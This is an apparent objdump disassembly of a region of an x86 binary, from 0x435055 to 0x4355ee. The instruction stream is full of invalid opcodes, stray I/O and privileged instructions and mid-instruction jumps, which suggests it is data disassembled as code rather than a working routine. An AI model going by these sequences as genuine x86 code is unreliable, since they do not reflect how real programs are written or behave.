  435055:	01 a4 5c 36 f9 33 4f 	add    %esp,0x4f33f936(%esp,%ebx,2)
  43505c:	09 80 7c f1 d3 59    	or     %eax,0x59d3f17c(%eax)
  435062:	c6                   	(bad)
  435063:	0a 51 31             	or     0x31(%ecx),%dl
  435066:	05 f4 c0 62 31       	add    $0x3162c0f4,%eax
  43506b:	f6 42 7d e0          	testb  $0xe0,0x7d(%edx)
  43506f:	6d                   	insl   (%dx),%es:(%edi)
  435070:	43                   	inc    %ebx
  435071:	7a 48                	jp     0x4350bb
  435073:	8c 37                	mov    %?,(%edi)
  435075:	6f                   	outsl  %ds:(%esi),(%dx)
  435076:	78 89                	js     0x435001
  435078:	4d                   	dec    %ebp
  435079:	28 09                	sub    %cl,(%ecx)
  43507b:	f0 cb                	lock lret
  43507d:	aa                   	stos   %al,%es:(%edi)
  43507e:	4b                   	dec    %ebx
  43507f:	00 47 3d             	add    %al,0x3d(%edi)
  435082:	24 2f                	and    $0x2f,%al
  435084:	42                   	inc    %edx
  435085:	90                   	nop
  435086:	55                   	push   %ebp
  435087:	1f                   	pop    %ds
  435088:	06                   	push   %es
  435089:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  43508a:	6d                   	insl   (%dx),%es:(%edi)
  43508b:	66 3f                	data16 aas
  43508d:	88 9c 8b a2 e2 03 65 	mov    %bl,0x6503e2a2(%ebx,%ecx,4)
  435094:	b9 0f 6d a1 30       	mov    $0x30a16d0f,%ecx
  435099:	5e                   	pop    %esi
  43509a:	db 17                	fistl  (%edi)
  43509c:	6b aa 94 89 e1 0a d4 	imul   $0xffffffd4,0xae18994(%edx),%ebp
  4350a3:	83 47 f8 91          	addl   $0xffffff91,-0x8(%edi)
  4350a7:	e8 6b f2 5b 78       	call   0x789f4317
  4350ac:	a2 82 d5 53 9f       	mov    %al,0x9f53d582
  4350b1:	d0 6c e2 7b          	shrb   $1,0x7b(%edx,%eiz,8)
  4350b5:	53                   	push   %ebx
  4350b6:	3c ce                	cmp    $0xce,%al
  4350b8:	50                   	push   %eax
  4350b9:	db af 29 d6 1d 59    	fldt   0x591dd629(%edi)
  4350bf:	88 62 01             	mov    %ah,0x1(%edx)
  4350c2:	c3                   	ret
  4350c3:	70 ad                	jo     0x435072
  4350c5:	cb                   	lret
  4350c6:	63 00                	arpl   %eax,(%eax)
  4350c8:	49                   	dec    %ecx
  4350c9:	63 57 7e             	arpl   %edx,0x7e(%edi)
  4350cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4350cd:	59                   	pop    %ecx
  4350ce:	86 af 6a 72 4c b9    	xchg   %ch,-0x46b38d96(%edi)
  4350d4:	bc 1c 05 a1 96       	mov    $0x96a1051c,%esp
  4350d9:	35 f3 48 05 2c       	xor    $0x2c0548f3,%eax
  4350de:	49                   	dec    %ecx
  4350df:	62 eb 1f             	(bad) {bad}
  4350e2:	e0 69                	loopne 0x43514d
  4350e4:	f6 56 ee             	notb   -0x12(%esi)
  4350e7:	ec                   	in     (%dx),%al
  4350e8:	99                   	cltd
  4350e9:	5f                   	pop    %edi
  4350ea:	95                   	xchg   %eax,%ebp
  4350eb:	9d                   	popf
  4350ec:	67 66 16             	addr16 pushw %ss
  4350ef:	5c                   	pop    %esp
  4350f0:	0f b5 4f 8d          	lgs    -0x73(%edi),%ecx
  4350f4:	52                   	push   %edx
  4350f5:	10 5f e3             	adc    %bl,-0x1d(%edi)
  4350f8:	90                   	nop
  4350f9:	38 24 48             	cmp    %ah,(%eax,%ecx,2)
  4350fc:	91                   	xchg   %eax,%ecx
  4350fd:	ea a4 bb e3 7c 01 51 	ljmp   $0x5101,$0x7ce3bba4
  435104:	c7                   	(bad)
  435105:	15 41 09 1c b4       	adc    $0xb41c0941,%eax
  43510a:	4a                   	dec    %edx
  43510b:	c2 aa 02             	ret    $0x2aa
  43510e:	67 1d 5c 14 71 79    	addr16 sbb $0x7971145c,%eax
  435114:	dc e2                	fsub   %st,%st(2)
  435116:	40                   	inc    %eax
  435117:	4c                   	dec    %esp
  435118:	48                   	dec    %eax
  435119:	4c                   	dec    %esp
  43511a:	79 76                	jns    0x435192
  43511c:	dc 09                	fmull  (%ecx)
  43511e:	8c cb                	mov    %cs,%ebx
  435120:	1a 33                	sbb    (%ebx),%dh
  435122:	5d                   	pop    %ebp
  435123:	57                   	push   %edi
  435124:	7c ab                	jl     0x4350d1
  435126:	db 08                	fisttpl (%eax)
  435128:	0a 16                	or     (%esi),%dl
  43512a:	1d a5 8a 8d 9c       	sbb    $0x9c8d8aa5,%eax
  43512f:	97                   	xchg   %eax,%edi
  435130:	63 44 dd aa          	arpl   %eax,-0x56(%ebp,%ebx,8)
  435134:	0d 7d 92 34 f5       	or     $0xf534927d,%eax
  435139:	26 08 23             	or     %ah,%es:(%ebx)
  43513c:	5b                   	pop    %ebx
  43513d:	eb 37                	jmp    0x435176
  43513f:	1d 60 73 07 23       	sbb    $0x23077360,%eax
  435144:	52                   	push   %edx
  435145:	f9                   	stc
  435146:	d8 cd                	fmul   %st(5),%st
  435148:	c9                   	leave
  435149:	5c                   	pop    %esp
  43514a:	dc 43 2d             	faddl  0x2d(%ebx)
  43514d:	0e                   	push   %cs
  43514e:	f8                   	clc
  43514f:	bf 89 e2 5d e7       	mov    $0xe75de289,%edi
  435154:	ec                   	in     (%dx),%al
  435155:	64 ae                	fs scas %es:(%edi),%al
  435157:	97                   	xchg   %eax,%edi
  435158:	a1 5a 35 42 fc       	mov    0xfc42355a,%eax
  43515d:	31 d0                	xor    %edx,%eax
  43515f:	4a                   	dec    %edx
  435160:	1b b6 27 28 f4 fe    	sbb    -0x10bd7d9(%esi),%esi
  435166:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  435167:	aa                   	stos   %al,%es:(%edi)
  435168:	7d 18                	jge    0x435182
  43516a:	ed                   	in     (%dx),%eax
  43516b:	02 22                	add    (%edx),%ah
  43516d:	ca 38 b1             	lret   $0xb138
  435170:	dc d9                	(bad)
  435172:	5a                   	pop    %edx
  435173:	d9 b5 d2 56 3f 39    	fnstenv 0x393f56d2(%ebp)
  435179:	55                   	push   %ebp
  43517a:	4e                   	dec    %esi
  43517b:	13 ad 0e 73 d1 18    	adc    0x18d1730e(%ebp),%ebp
  435181:	fd                   	std
  435182:	71 e0                	jno    0x435164
  435184:	13 82 2a d0 d6 e0    	adc    -0x1f292fd6(%edx),%eax
  43518a:	68 aa 19 78 5a       	push   $0x5a7819aa
  43518f:	cc                   	int3
  435190:	02 46 6f             	add    0x6f(%esi),%al
  435193:	0b b7 93 75 71 24    	or     0x24717593(%edi),%esi
  435199:	03 cf                	add    %edi,%ecx
  43519b:	ba 9a ba cc 26       	mov    $0x26ccba9a,%edx
  4351a0:	11 e1                	adc    %esp,%ecx
  4351a2:	ba 16 ec b8 ea       	mov    $0xeab8ec16,%edx
  4351a7:	ac                   	lods   %ds:(%esi),%al
  4351a8:	fe                   	(bad)
  4351a9:	6c                   	insb   (%dx),%es:(%edi)
  4351aa:	28 5a 08             	sub    %bl,0x8(%edx)
  4351ad:	82 dc d5             	sbb    $0xd5,%ah
  4351b0:	9d                   	popf
  4351b1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4351b2:	d9 a8 42 17 3b 02    	fldcw  0x23b1742(%eax)
  4351b8:	b5 66                	mov    $0x66,%ch
  4351ba:	16                   	push   %ss
  4351bb:	77 43                	ja     0x435200
  4351bd:	31 8c 6d 65 66 74 cf 	xor    %ecx,-0x308b999b(%ebp,%ebp,2)
  4351c4:	b9 82 ec bc f9       	mov    $0xf9bcec82,%ecx
  4351c9:	4f                   	dec    %edi
  4351ca:	11 8f 31 8a 3d 28    	adc    %ecx,0x283d8a31(%edi)
  4351d0:	eb e1                	jmp    0x4351b3
  4351d2:	04 42                	add    $0x42,%al
  4351d4:	5a                   	pop    %edx
  4351d5:	f2 df 8f aa 2a 5d 36 	repnz fisttps 0x365d2aaa(%edi)
  4351dc:	e5 b9                	in     $0xb9,%eax
  4351de:	21 4a 4d             	and    %ecx,0x4d(%edx)
  4351e1:	ed                   	in     (%dx),%eax
  4351e2:	ea 71 0a 3c 1a b2 87 	ljmp   $0x87b2,$0x1a3c0a71
  4351e9:	fe                   	(bad)
  4351ea:	59                   	pop    %ecx
  4351eb:	b8 ba a8 ff 1a       	mov    $0x1affa8ba,%eax
  4351f0:	70 f0                	jo     0x4351e2
  4351f2:	8d 08                	lea    (%eax),%ecx
  4351f4:	06                   	push   %es
  4351f5:	28 f5                	sub    %dh,%ch
  4351f7:	68 39 8c d1 ba       	push   $0xbad18c39
  4351fc:	6c                   	insb   (%dx),%es:(%edi)
  4351fd:	df 11                	fists  (%ecx)
  4351ff:	e7 b7                	out    %eax,$0xb7
  435201:	57                   	push   %edi
  435202:	70 60                	jo     0x435264
  435204:	cd 03                	int    $0x3
  435206:	dc 24 d8             	fsubl  (%eax,%ebx,8)
  435209:	e4 2d                	in     $0x2d,%al
  43520b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  43520c:	1c d4                	sbb    $0xd4,%al
  43520e:	17                   	pop    %ss
  43520f:	10 6b 91             	adc    %ch,-0x6f(%ebx)
  435212:	e7 9e                	out    %eax,$0x9e
  435214:	f5                   	cmc
  435215:	d1 8f 18 2b d4 da    	rorl   $1,-0x252bd4e8(%edi)
  43521b:	32 20                	xor    (%eax),%ah
  43521d:	cf                   	iret
  43521e:	63 f5                	arpl   %esi,%ebp
  435220:	22 3f                	and    (%edi),%bh
  435222:	e4 3e                	in     $0x3e,%al
  435224:	e4 74                	in     $0x74,%al
  435226:	4f                   	dec    %edi
  435227:	d9 6f f1             	fldcw  -0xf(%edi)
  43522a:	13 b4 01 19 1e 0e 57 	adc    0x570e1e19(%ecx,%eax,1),%esi
  435231:	f9                   	stc
  435232:	53                   	push   %ebx
  435233:	69 2a 1e 5b 5d 06    	imul   $0x65d5b1e,(%edx),%ebp
  435239:	1d 0b 05 5d f0       	sbb    $0xf05d050b,%eax
  43523e:	de 4f a0             	fimuls -0x60(%edi)
  435241:	ea bb f1 5e 8d 1e b5 	ljmp   $0xb51e,$0x8d5ef1bb
  435248:	f5                   	cmc
  435249:	57                   	push   %edi
  43524a:	97                   	xchg   %eax,%edi
  43524b:	4c                   	dec    %esp
  43524c:	d3 d0                	rcl    %cl,%eax
  43524e:	9e                   	sahf
  43524f:	0a cb                	or     %bl,%cl
  435251:	05 11 c5 cd 5d       	add    $0x5dcdc511,%eax
  435256:	08 37                	or     %dh,(%edi)
  435258:	5c                   	pop    %esp
  435259:	d4 ee                	aam    $0xee
  43525b:	7c 58                	jl     0x4352b5
  43525d:	cb                   	lret
  43525e:	e9 6d 74 c3 cb       	jmp    0xcc06c6d0
  435263:	61                   	popa
  435264:	a2 d4 99 34 16       	mov    %al,0x163499d4
  435269:	5a                   	pop    %edx
  43526a:	f3 59                	repz pop %ecx
  43526c:	7f 91                	jg     0x4351ff
  43526e:	a0 21 62 74 6b       	mov    0x6b746221,%al
  435273:	7d 67                	jge    0x4352dc
  435275:	da 7c 99 68          	fidivrl 0x68(%ecx,%ebx,4)
  435279:	c2 82 41             	ret    $0x4182
  43527c:	40                   	inc    %eax
  43527d:	49                   	dec    %ecx
  43527e:	cb                   	lret
  43527f:	4a                   	dec    %edx
  435280:	67 ae                	scas   %es:(%di),%al
  435282:	7c f3                	jl     0x435277
  435284:	1b 75 38             	sbb    0x38(%ebp),%esi
  435287:	60                   	pusha
  435288:	f2 40                	repnz inc %eax
  43528a:	d4 ba                	aam    $0xba
  43528c:	b0 06                	mov    $0x6,%al
  43528e:	8d 79 80             	lea    -0x80(%ecx),%edi
  435291:	0c 01                	or     $0x1,%al
  435293:	1a b3 c6 88 3f 38    	sbb    0x383f88c6(%ebx),%dh
  435299:	4f                   	dec    %edi
  43529a:	45                   	inc    %ebp
  43529b:	f5                   	cmc
  43529c:	92                   	xchg   %eax,%edx
  43529d:	4f                   	dec    %edi
  43529e:	d9 ab 0b d5 18 f7    	fldcw  -0x8e72af5(%ebx)
  4352a4:	ca a1 4b             	lret   $0x4ba1
  4352a7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4352a8:	46                   	inc    %esi
  4352a9:	25 2d 9d 3e 2a       	and    $0x2a3e9d2d,%eax
  4352ae:	4e                   	dec    %esi
  4352af:	8a 5f 07             	mov    0x7(%edi),%bl
  4352b2:	41                   	inc    %ecx
  4352b3:	7e 68                	jle    0x43531d
  4352b5:	f4                   	hlt
  4352b6:	2e 8f                	cs (bad)
  4352b8:	a0 d3 d3 ef 19       	mov    0x19efd3d3,%al
  4352bd:	22 91 42 61 69 33    	and    0x33696142(%ecx),%dl
  4352c3:	06                   	push   %es
  4352c4:	01 51 e2             	add    %edx,-0x1e(%ecx)
  4352c7:	f1                   	int1
  4352c8:	31 8a de 2b 79 b2    	xor    %ecx,-0x4d86d422(%edx)
  4352ce:	94                   	xchg   %eax,%esp
  4352cf:	8d bc 03 3f 01 e7 ee 	lea    -0x1118fec1(%ebx,%eax,1),%edi
  4352d6:	1d 66 92 ea 62       	sbb    $0x62ea9266,%eax
  4352db:	0f 96 c2             	setbe  %dl
  4352de:	40                   	inc    %eax
  4352df:	7c 8d                	jl     0x43526e
  4352e1:	be 48 17 cf d1       	mov    $0xd1cf1748,%esi
  4352e6:	49                   	dec    %ecx
  4352e7:	af                   	scas   %es:(%edi),%eax
  4352e8:	48                   	dec    %eax
  4352e9:	12 3e                	adc    (%esi),%bh
  4352eb:	96                   	xchg   %eax,%esi
  4352ec:	b5 66                	mov    $0x66,%ch
  4352ee:	40                   	inc    %eax
  4352ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4352f0:	5c                   	pop    %esp
  4352f1:	49                   	dec    %ecx
  4352f2:	c4 1d ec af 4b 22    	les    0x224bafec,%ebx
  4352f8:	da 32                	fidivl (%edx)
  4352fa:	f9                   	stc
  4352fb:	76 ae                	jbe    0x4352ab
  4352fd:	fa                   	cli
  4352fe:	f7 fa                	idiv   %edx
  435300:	fe                   	(bad)
  435301:	57                   	push   %edi
  435302:	9a dd 0d e0 10 26 b0 	lcall  $0xb026,$0x10e00ddd
  435309:	ea c3 db fb b8 8a 80 	ljmp   $0x808a,$0xb8fbdbc3
  435310:	92                   	xchg   %eax,%edx
  435311:	a0 7f bf ec 8b       	mov    0x8becbf7f,%al
  435316:	d6                   	salc
  435317:	08 50 a2             	or     %dl,-0x5e(%eax)
  43531a:	7a 4d                	jp     0x435369
  43531c:	94                   	xchg   %eax,%esp
  43531d:	4f                   	dec    %edi
  43531e:	50                   	push   %eax
  43531f:	b5 38                	mov    $0x38,%ch
  435321:	27                   	daa
  435322:	10 34 75 90 cd fe b1 	adc    %dh,-0x4e013270(,%esi,2)
  435329:	50                   	push   %eax
  43532a:	e7 53                	out    %eax,$0x53
  43532c:	32 6f 70             	xor    0x70(%edi),%ch
  43532f:	90                   	nop
  435330:	b6 c2                	mov    $0xc2,%dh
  435332:	cc                   	int3
  435333:	51                   	push   %ecx
  435334:	15 c8 ef be 36       	adc    $0x36beefc8,%eax
  435339:	36 82 7c 73 99 db    	cmpb   $0xdb,%ss:-0x67(%ebx,%esi,2)
  43533f:	38 bc 00 00 ef 53 f2 	cmp    %bh,-0xdac1100(%eax,%eax,1)
  435346:	2a 4f 4b             	sub    0x4b(%edi),%cl
  435349:	64 5a                	fs pop %edx
  43534b:	05 2d c3 27 78       	add    $0x7827c32d,%eax
  435350:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  435351:	2f                   	das
  435352:	8b a8 f1 62 e0 dd    	mov    -0x221f9d0f(%eax),%ebp
  435358:	62 14 96             	bound  %edx,(%esi,%edx,4)
  43535b:	4d                   	dec    %ebp
  43535c:	d5 ad                	aad    $0xad
  43535e:	64 01 37             	add    %esi,%fs:(%edi)
  435361:	2c 7e                	sub    $0x7e,%al
  435363:	94                   	xchg   %eax,%esp
  435364:	65 2f                	gs das
  435366:	bb 1a e8 6b f7       	mov    $0xf76be81a,%ebx
  43536b:	b8 a9 4a 92 a3       	mov    $0xa3924aa9,%eax
  435370:	39 11                	cmp    %edx,(%ecx)
  435372:	b3 73                	mov    $0x73,%bl
  435374:	f3 7b 69             	repz jnp 0x4353e0
  435377:	94                   	xchg   %eax,%esp
  435378:	8c 7d 29             	mov    %?,0x29(%ebp)
  43537b:	38 de                	cmp    %bl,%dh
  43537d:	36 4a                	ss dec %edx
  43537f:	f6 db                	neg    %bl
  435381:	eb 22                	jmp    0x4353a5
  435383:	d1 a9 67 e4 d4 e9    	shrl   $1,-0x162b1b99(%ecx)
  435389:	42                   	inc    %edx
  43538a:	a0 54 2e 22 bb       	mov    0xbb222e54,%al
  43538f:	62 06                	bound  %eax,(%esi)
  435391:	c6                   	(bad)
  435392:	95                   	xchg   %eax,%ebp
  435393:	4d                   	dec    %ebp
  435394:	ac                   	lods   %ds:(%esi),%al
  435395:	5b                   	pop    %ebx
  435396:	c7                   	(bad)
  435397:	d0 52 19             	rclb   $1,0x19(%edx)
  43539a:	ee                   	out    %al,(%dx)
  43539b:	f9                   	stc
  43539c:	73 0d                	jae    0x4353ab
  43539e:	8d 47 94             	lea    -0x6c(%edi),%eax
  4353a1:	e7 07                	out    %eax,$0x7
  4353a3:	2b fb                	sub    %ebx,%edi
  4353a5:	9e                   	sahf
  4353a6:	3c 5b                	cmp    $0x5b,%al
  4353a8:	29 92 dd 0e 54 56    	sub    %edx,0x56540edd(%edx)
  4353ae:	d8 e8                	fsubr  %st(0),%st
  4353b0:	72 2f                	jb     0x4353e1
  4353b2:	0f f5 d0             	pmaddwd %mm0,%mm2
  4353b5:	c0 79 3d 81          	sarb   $0x81,0x3d(%ecx)
  4353b9:	d2 f1                	shl    %cl,%cl
  4353bb:	16                   	push   %ss
  4353bc:	83 fd 26             	cmp    $0x26,%ebp
  4353bf:	70 5d                	jo     0x43541e
  4353c1:	96                   	xchg   %eax,%esi
  4353c2:	c9                   	leave
  4353c3:	d3 dd                	rcr    %cl,%ebp
  4353c5:	7d bd                	jge    0x435384
  4353c7:	ad                   	lods   %ds:(%esi),%eax
  4353c8:	84 47 34             	test   %al,0x34(%edi)
  4353cb:	92                   	xchg   %eax,%edx
  4353cc:	35 f7 ed 6e 1b       	xor    $0x1b6eedf7,%eax
  4353d1:	8e 4a 24             	mov    0x24(%edx),%cs
  4353d4:	d5 9b                	aad    $0x9b
  4353d6:	c4                   	(bad)
  4353d7:	f1                   	int1
  4353d8:	c5 c2 6a             	(bad)
  4353db:	47                   	inc    %edi
  4353dc:	77 18                	ja     0x4353f6
  4353de:	dc d5                	(bad)
  4353e0:	fa                   	cli
  4353e1:	0c e0                	or     $0xe0,%al
  4353e3:	af                   	scas   %es:(%edi),%eax
  4353e4:	35 2f 49 65 1a       	xor    $0x1a65492f,%eax
  4353e9:	fd                   	std
  4353ea:	3c 42                	cmp    $0x42,%al
  4353ec:	ea d1 21 64 5c 02 2d 	ljmp   $0x2d02,$0x5c6421d1
  4353f3:	69 fe fb 01 06 87    	imul   $0x870601fb,%esi,%edi
  4353f9:	1e                   	push   %ds
  4353fa:	e4 6c                	in     $0x6c,%al
  4353fc:	08 a5 28 c7 94 5e    	or     %ah,0x5e94c728(%ebp)
  435402:	17                   	pop    %ss
  435403:	71 1d                	jno    0x435422
  435405:	64 5a                	fs pop %edx
  435407:	bf 39 a1 0b fb       	mov    $0xfb0ba139,%edi
  43540c:	29 02                	sub    %eax,(%edx)
  43540e:	f8                   	clc
  43540f:	23 13                	and    (%ebx),%edx
  435411:	66 8d                	lea    (bad),%dx
  435413:	d7                   	xlat   %ds:(%ebx)
  435414:	28 ac 21 5f 41 2a c5 	sub    %ch,-0x3ad5bea1(%ecx,%eiz,1)
  43541b:	ec                   	in     (%dx),%al
  43541c:	11 ef                	adc    %ebp,%edi
  43541e:	95                   	xchg   %eax,%ebp
  43541f:	92                   	xchg   %eax,%edx
  435420:	c2 23 59             	ret    $0x5923
  435423:	1f                   	pop    %ds
  435424:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  435425:	33 6f d7             	xor    -0x29(%edi),%ebp
  435428:	d3 70 1f             	shll   %cl,0x1f(%eax)
  43542b:	df 97 2a 69 38 49    	fists  0x4938692a(%edi)
  435431:	05 22 e9 bb 16       	add    $0x16bbe922,%eax
  435436:	b0 41                	mov    $0x41,%al
  435438:	a8 fb                	test   $0xfb,%al
  43543a:	2e cf                	cs iret
  43543c:	60                   	pusha
  43543d:	5a                   	pop    %edx
  43543e:	6d                   	insl   (%dx),%es:(%edi)
  43543f:	57                   	push   %edi
  435440:	cf                   	iret
  435441:	bb 4b 3c 22 ad       	mov    $0xad223c4b,%ebx
  435446:	c6                   	(bad)
  435447:	ec                   	in     (%dx),%al
  435448:	90                   	nop
  435449:	de 2f                	fisubrs (%edi)
  43544b:	cd 94                	int    $0x94
  43544d:	21 2b                	and    %ebp,(%ebx)
  43544f:	d8 f3                	fdiv   %st(3),%st
  435451:	7b c2                	jnp    0x435415
  435453:	7d 1f                	jge    0x435474
  435455:	31 25 79 1e c4 b0    	xor    %esp,0xb0c41e79
  43545b:	8e ee                	mov    %esi,%gs
  43545d:	fc                   	cld
  43545e:	cb                   	lret
  43545f:	a9 4e bc 8d ab       	test   $0xab8dbc4e,%eax
  435464:	f8                   	clc
  435465:	47                   	inc    %edi
  435466:	b6 4f                	mov    $0x4f,%dh
  435468:	df 93 f6 ec b6 5c    	fists  0x5cb6ecf6(%ebx)
  43546e:	1e                   	push   %ds
  43546f:	35 06 41 f6 2c       	xor    $0x2cf64106,%eax
  435474:	0c 69                	or     $0x69,%al
  435476:	4f                   	dec    %edi
  435477:	c7                   	(bad)
  435478:	bc 2e dc 42 87       	mov    $0x8742dc2e,%esp
  43547d:	2f                   	das
  43547e:	fa                   	cli
  43547f:	dc a1 c9 47 d7 a7    	fsubl  -0x5828b837(%ecx)
  435485:	ec                   	in     (%dx),%al
  435486:	0e                   	push   %cs
  435487:	2f                   	das
  435488:	3f                   	aas
  435489:	f0 7b c8             	lock jnp 0x435454
  43548c:	f9                   	stc
  43548d:	b7 c5                	mov    $0xc5,%bh
  43548f:	7e 43                	jle    0x4354d4
  435491:	21 d5                	and    %edx,%ebp
  435493:	15 f5 65 47 86       	adc    $0x864765f5,%eax
  435498:	64 38 47 de          	cmp    %al,%fs:-0x22(%edi)
  43549c:	8f                   	(bad)
  43549d:	54                   	push   %esp
  43549e:	3c af                	cmp    $0xaf,%al
  4354a0:	e4 8f                	in     $0x8f,%al
  4354a2:	d3 33                	shll   %cl,(%ebx)
  4354a4:	f0 ef                	lock out %eax,(%dx)
  4354a6:	4e                   	dec    %esi
  4354a7:	b5 3a                	mov    $0x3a,%ch
  4354a9:	fa                   	cli
  4354aa:	56                   	push   %esi
  4354ab:	c1 e4 ac             	shl    $0xac,%esp
  4354ae:	ac                   	lods   %ds:(%esi),%al
  4354af:	2a 94 78 df d9 95 ae 	sub    -0x516a2621(%eax,%edi,2),%dl
  4354b6:	6d                   	insl   (%dx),%es:(%edi)
  4354b7:	fc                   	cld
  4354b8:	93                   	xchg   %eax,%ebx
  4354b9:	62 7c 0f bf          	bound  %edi,-0x41(%edi,%ecx,1)
  4354bd:	2d a9 f1 9e 5d       	sub    $0x5d9ef1a9,%eax
  4354c2:	41                   	inc    %ecx
  4354c3:	7c 2e                	jl     0x4354f3
  4354c5:	41                   	inc    %ecx
  4354c6:	42                   	inc    %edx
  4354c7:	67 06                	addr16 push %es
  4354c9:	b9 86 d6 52 8f       	mov    $0x8f52d686,%ecx
  4354ce:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4354cf:	ef                   	out    %eax,(%dx)
  4354d0:	bd 77 ee 30 c3       	mov    $0xc330ee77,%ebp
  4354d5:	4f                   	dec    %edi
  4354d6:	a2 b2 ca 4f 4b       	mov    %al,0x4b4fcab2
  4354db:	5b                   	pop    %ebx
  4354dc:	74 d4                	je     0x4354b2
  4354de:	cf                   	iret
  4354df:	7b 55                	jnp    0x435536
  4354e1:	3b 79 35             	cmp    0x35(%ecx),%edi
  4354e4:	78 6d                	js     0x435553
  4354e6:	7a b1                	jp     0x435499
  4354e8:	4d                   	dec    %ebp
  4354e9:	74 65                	je     0x435550
  4354eb:	4d                   	dec    %ebp
  4354ec:	bc 73 ff bb 0e       	mov    $0xebbff73,%esp
  4354f1:	a2 0c e0 b1 1c       	mov    %al,0x1cb1e00c
  4354f6:	2c fa                	sub    $0xfa,%al
  4354f8:	cb                   	lret
  4354f9:	5f                   	pop    %edi
  4354fa:	e4 b7                	in     $0xb7,%al
  4354fc:	50                   	push   %eax
  4354fd:	9e                   	sahf
  4354fe:	a8 e2                	test   $0xe2,%al
  435500:	49                   	dec    %ecx
  435501:	e8 e8 00 0d 81       	call   0x815055ee
  435506:	e3 8a                	jecxz  0x435492
  435508:	61                   	popa
  435509:	4e                   	dec    %esi
  43550a:	8c e1                	mov    %fs,%ecx
  43550c:	88 0f                	mov    %cl,(%edi)
  43550e:	e7 a4                	out    %eax,$0xa4
  435510:	1b 4d c4             	sbb    -0x3c(%ebp),%ecx
  435513:	2f                   	das
  435514:	f2 9d                	repnz popf
  435516:	0b 71 7b             	or     0x7b(%ecx),%esi
  435519:	04 6c                	add    $0x6c,%al
  43551b:	3f                   	aas
  43551c:	4c                   	dec    %esp
  43551d:	9b                   	fwait
  43551e:	58                   	pop    %eax
  43551f:	79 d9                	jns    0x4354fa
  435521:	4f                   	dec    %edi
  435522:	d1 de                	rcr    $1,%esi
  435524:	e9 de 6c cd 18       	jmp    0x1910c207
  435529:	6d                   	insl   (%dx),%es:(%edi)
  43552a:	6b 03 f8             	imul   $0xfffffff8,(%ebx),%eax
  43552d:	d3 13                	rcll   %cl,(%ebx)
  43552f:	63 0c 36             	arpl   %ecx,(%esi,%esi,1)
  435532:	c1 2e 46             	shrl   $0x46,(%esi)
  435535:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  435536:	99                   	cltd
  435537:	97                   	xchg   %eax,%edi
  435538:	c1 e2 44             	shl    $0x44,%edx
  43553b:	db 88 f4 bd 94 f2    	fisttpl -0xd6b420c(%eax)
  435541:	4f                   	dec    %edi
  435542:	b9 a8 7b e4 c0       	mov    $0xc0e47ba8,%ecx
  435547:	49                   	dec    %ecx
  435548:	8c fe                	mov    %?,%esi
  43554a:	51                   	push   %ecx
  43554b:	65 79 fc             	gs jns 0x43554a
  43554e:	5c                   	pop    %esp
  43554f:	8d                   	lea    (bad),%esi
  435550:	f3 2a ef             	repz sub %bh,%ch
  435553:	6c                   	insb   (%dx),%es:(%edi)
  435554:	67 1f                	addr16 pop %ds
  435556:	fd                   	std
  435557:	00 6e 1e             	add    %ch,0x1e(%esi)
  43555a:	2c 30                	sub    $0x30,%al
  43555c:	e8 32 99 84 e2       	call   0xe2c7ee93
  435561:	05 de ca ac 36       	add    $0x36accade,%eax
  435566:	e2 f3                	loop   0x43555b
  435568:	f8                   	clc
  435569:	8c 12                	mov    %ss,(%edx)
  43556b:	04 a3                	add    $0xa3,%al
  43556d:	1c a7                	sbb    $0xa7,%al
  43556f:	a1 8f 6b 8a 54       	mov    0x548a6b8f,%eax
  435574:	3f                   	aas
  435575:	17                   	pop    %ss
  435576:	43                   	inc    %ebx
  435577:	48                   	dec    %eax
  435578:	ea fa 6b cc f6 63 09 	ljmp   $0x963,$0xf6cc6bfa
  43557f:	0b 05 41 02 c5 e2    	or     0xe2c50241,%eax
  435585:	6c                   	insb   (%dx),%es:(%edi)
  435586:	73 4d                	jae    0x4355d5
  435588:	d0 f9                	sar    $1,%cl
  43558a:	5f                   	pop    %edi
  43558b:	49                   	dec    %ecx
  43558c:	3b 14 d1             	cmp    (%ecx,%edx,8),%edx
  43558f:	50                   	push   %eax
  435590:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  435591:	d9 82 48 f8 23 9f    	flds   -0x60dc07b8(%edx)
  435597:	e0 4a                	loopne 0x4355e3
  435599:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  43559a:	5a                   	pop    %edx
  43559b:	52                   	push   %edx
  43559c:	8c 0d 31 5c 72 8a    	mov    %cs,0x8a725c31
  4355a2:	ca 84 8d             	lret   $0x8d84
  4355a5:	e2 01                	loop   0x4355a8
  4355a7:	8a 10                	mov    (%eax),%dl
  4355a9:	62 66 a5             	bound  %esp,-0x5b(%esi)
  4355ac:	53                   	push   %ebx
  4355ad:	01 18                	add    %ebx,(%eax)
  4355af:	fe 4e 7f             	decb   0x7f(%esi)
  4355b2:	08 a4 96 55 e6 78 bd 	or     %ah,-0x428719ab(%esi,%edx,4)
  4355b9:	c2 cd 58             	ret    $0x58cd
  4355bc:	91                   	xchg   %eax,%ecx
  4355bd:	fb                   	sti
  4355be:	04 e5                	add    $0xe5,%al
  4355c0:	48                   	dec    %eax
  4355c1:	32 08                	xor    (%eax),%cl
  4355c3:	4c                   	dec    %esp
  4355c4:	18 41 e9             	sbb    %al,-0x17(%ecx)
  4355c7:	b5 7b                	mov    $0x7b,%ch
  4355c9:	53                   	push   %ebx
  4355ca:	d5 f8                	aad    $0xf8
  4355cc:	60                   	pusha
  4355cd:	19 e7                	sbb    %esp,%edi
  4355cf:	33 af 06 44 c9 10    	xor    0x10c94406(%edi),%ebp
  4355d5:	8e 8c a6 51 2b e3 d9 	mov    -0x261cd4af(%esi,%eiz,4),%cs
  4355dc:	9a 6a b4 be f3 b5 31 	lcall  $0x31b5,$0xf3beb46a
  4355e3:	20 ed                	and    %ch,%ch
  4355e5:	72 ba                	jb     0x4355a1
  4355e7:	bd f6 e7 23 00       	mov    $0x23e7f6,%ebp
  4355ec:	29 fd                	sub    %edi,%ebp
  4355ee:	ae                   	scas   %es:(%edi),%al
